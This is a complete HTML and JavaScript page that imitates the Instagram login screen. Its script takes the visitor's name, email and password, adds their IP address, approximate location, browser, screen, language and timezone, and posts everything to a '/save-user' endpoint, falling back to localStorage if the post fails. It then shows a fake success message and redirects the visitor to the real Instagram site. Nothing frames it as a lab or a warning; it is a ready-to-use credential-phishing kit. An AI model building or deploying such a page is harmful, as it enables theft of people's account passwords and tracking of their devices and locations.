<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 350px;
            background: white;
            padding: 40px 30px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-family: 'Script MT', cursive;
            font-size: 42px;
            font-weight: 400;
            color: #262626;
            letter-spacing: -1px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-group input {
            width: 100%;
            padding: 9px 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            background: #fafafa;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #a8a8a8;
            background: white;
        }

        .form-group input.error {
            border-color: #ed4956;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .login-btn .spinner {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .login-btn.loading .spinner {
            display: block;
        }

        .login-btn.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 12px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {
            text-align: center;
            font-size: 14px;
            color: #385185;
            font-weight: 600;
            cursor: pointer;
        }

        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }

        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #c3e6cb;
            margin-top: 12px;
            font-size: 13px;
            animation: slideDown 0.4s ease;
        }

        .success-message.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .info-display {
            font-size: 11px;
            color: #8e8e8e;
            margin-top: 12px;
            padding: 8px;
            background: #fafafa;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            display: none;
        }

        .info-display.show {
            display: block;
        }

        .info-display span {
            color: #262626;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Instagram</h1>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="name" placeholder="Full Name" required />
                <div id="nameError" class="error-message">Please enter your name</div>
            </div>

            <div class="form-group">
                <input type="email" id="email" placeholder="Email or Phone" required />
                <div id="emailError" class="error-message">Please enter a valid email</div>
            </div>

            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required />
                <div id="passwordError" class="error-message">Password must be at least 6 characters</div>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">
                <span class="btn-text">Log In</span>
                <div class="spinner"></div>
            </button>
        </form>

        <div class="divider">OR</div>
        <div class="fb-login">Log in with Facebook</div>

        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div id="successMessage" class="success-message">
            ✅ Login successful! Redirecting to Instagram...
        </div>

        <div id="infoDisplay" class="info-display">
            🌐 IP: <span id="ipInfo">Detecting...</span><br />
            📍 Location: <span id="locationInfo">Detecting...</span><br />
            🖥️ Browser: <span id="browserInfo">Detecting...</span><br />
            ⏰ Time: <span id="timeInfo">Detecting...</span>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const nameInput = document.getElementById('name');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const nameError = document.getElementById('nameError');
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            const loginBtn = document.getElementById('loginBtn');
            const successMessage = document.getElementById('successMessage');
            const infoDisplay = document.getElementById('infoDisplay');
            const ipInfo = document.getElementById('ipInfo');
            const locationInfo = document.getElementById('locationInfo');
            const browserInfo = document.getElementById('browserInfo');
            const timeInfo = document.getElementById('timeInfo');

            // Collect all data
            async function collectData() {
                const data = {
                    name: nameInput.value.trim(),
                    email: emailInput.value.trim(),
                    password: passwordInput.value.trim(),
                    ip: 'Detecting...',
                    location: 'Detecting...',
                    browser: navigator.userAgent,
                    os: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    submitted_at: new Date().toLocaleString('en-US', {
                        dateStyle: 'medium',
                        timeStyle: 'short'
                    }),
                    sub_no: `INSTA-${Date.now().toString().slice(-10)}`
                };

                // Get IP
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const ipData = await response.json();
                    data.ip = ipData.ip;
                    ipInfo.textContent = ipData.ip;
                } catch (error) {
                    data.ip = '127.0.0.1';
                    ipInfo.textContent = '127.0.0.1 (fallback)';
                }

                // Get location (approximate)
                try {
                    const locResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const locData = await locResponse.json();
                    if (locData.city && locData.country_name) {
                        data.location = `${locData.city}, ${locData.country_name}`;
                        locationInfo.textContent = data.location;
                    } else {
                        data.location = 'Unknown';
                        locationInfo.textContent = 'Unknown';
                    }
                } catch (error) {
                    data.location = 'Unknown';
                    locationInfo.textContent = 'Unknown';
                }

                browserInfo.textContent = navigator.userAgent.split(' ').slice(0, 3).join(' ');
                timeInfo.textContent = data.submitted_at;

                infoDisplay.classList.add('show');
                return data;
            }

            // Validate form
            function validateForm(name, email, password) {
                let isValid = true;

                if (!name || name.length < 2) {
                    nameInput.classList.add('error');
                    nameError.classList.add('show');
                    isValid = false;
                } else {
                    nameInput.classList.remove('error');
                    nameError.classList.remove('show');
                }

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!email || !emailRegex.test(email)) {
                    emailInput.classList.add('error');
                    emailError.classList.add('show');
                    isValid = false;
                } else {
                    emailInput.classList.remove('error');
                    emailError.classList.remove('show');
                }

                if (!password || password.length < 6) {
                    passwordInput.classList.add('error');
                    passwordError.classList.add('show');
                    isValid = false;
                } else {
                    passwordInput.classList.remove('error');
                    passwordError.classList.remove('show');
                }

                return isValid;
            }

            // Save to server
            async function saveToServer(data) {
                try {
                    const response = await fetch('/save-user', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    });

                    if (!response.ok) {
                        throw new Error('Server response was not ok');
                    }

                    return await response.json();
                } catch (error) {
                    console.log('⚠️ Server not available, saving locally...');
                    localStorage.setItem('instagram_user', JSON.stringify(data));
                    return { success: true, local: true };
                }
            }

            // Form submit
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const name = nameInput.value.trim();
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();

                if (!validateForm(name, email, password)) {
                    return;
                }

                loginBtn.classList.add('loading');
                loginBtn.disabled = true;
                successMessage.classList.remove('show');

                try {
                    const data = await collectData();
                    const result = await saveToServer(data);

                    console.log('✅ Instagram Login Data:', data);
                    console.log('📦 Save Result:', result);

                    successMessage.textContent = result.local 
                        ? '✅ Login successful! (Saved locally)' 
                        : '✅ Login successful! Redirecting to Instagram...';
                    successMessage.classList.add('show');

                    // Clear form
                    nameInput.value = '';
                    emailInput.value = '';
                    passwordInput.value = '';

                    // Redirect
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com';
                    }, 2000);

                } catch (error) {
                    console.error('❌ Error:', error);
                    successMessage.textContent = '❌ Error logging in. Please try again.';
                    successMessage.classList.add('show');
                    successMessage.style.background = '#f8d7da';
                    successMessage.style.borderColor = '#f5c6cb';
                    successMessage.style.color = '#721c24';
                } finally {
                    loginBtn.classList.remove('loading');
                    loginBtn.disabled = false;
                }
            });

            // Real-time validation
            nameInput.addEventListener('input', function() {
                if (this.value.trim().length >= 2) {
                    this.classList.remove('error');
                    nameError.classList.remove('show');
                }
            });

            emailInput.addEventListener('input', function() {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (emailRegex.test(this.value.trim())) {
                    this.classList.remove('error');
                    emailError.classList.remove('show');
                }
            });

            passwordInput.addEventListener('input', function() {
                if (this.value.trim().length >= 6) {
                    this.classList.remove('error');
                    passwordError.classList.remove('show');
                }
            });

            console.log('📸 Instagram Login Page loaded!');
        });
    </script>
</body>
</html>
